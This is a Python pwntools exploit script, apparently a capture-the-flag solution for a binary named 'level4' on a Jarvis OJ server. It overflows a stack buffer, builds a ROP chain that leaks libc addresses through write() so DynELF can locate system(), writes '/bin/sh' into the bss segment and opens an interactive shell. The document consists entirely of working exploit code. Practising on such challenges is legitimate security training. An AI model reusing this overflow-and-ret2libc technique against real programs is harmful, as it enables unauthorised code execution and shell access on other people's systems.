from pwn import *
import sys
#don't know the version of libc
#use DynELF
#DynELF moudel can find the address of system(),but we need read /bin/sh by ourself using {bss segment} and {read()}
if len(sys.argv)<2:
	p = process('./level4')
	elf = ELF('./level4')
	libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
else:
	p = remote('pwn2.jarvisoj.com',9880)
	elf = ELF('./level4')
	
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

def leak(address):
	payload1 = 'A'*0x88+'junk'+p32(write_plt)+p32(main_addr)+p32(1)+p32(address)+p32(4)
	p.sendline(payload1)
	data = p.recv(4)
	print hex(u32(data))
	log.info("%#x => %s" % (address, (data or '').encode('hex')))
	return data

d = DynELF(leak,elf=ELF('./level4'))
system_addr = d.lookup('system', 'libc')

bss_start = 0x0804a024
#bss_start = elf.symbols['__bss_start']
pop_pop_pop_ret = 0x08048509

payload2 = 'A'*0x88+'junk'+p32(read_plt)+p32(pop_pop_pop_ret)+p32(0)+p32(bss_start)+p32(8)+p32(system_addr)+'junk'+p32(bss_start)

p.sendline(payload2)
p.sendline('/bin/sh')

p.interactive()
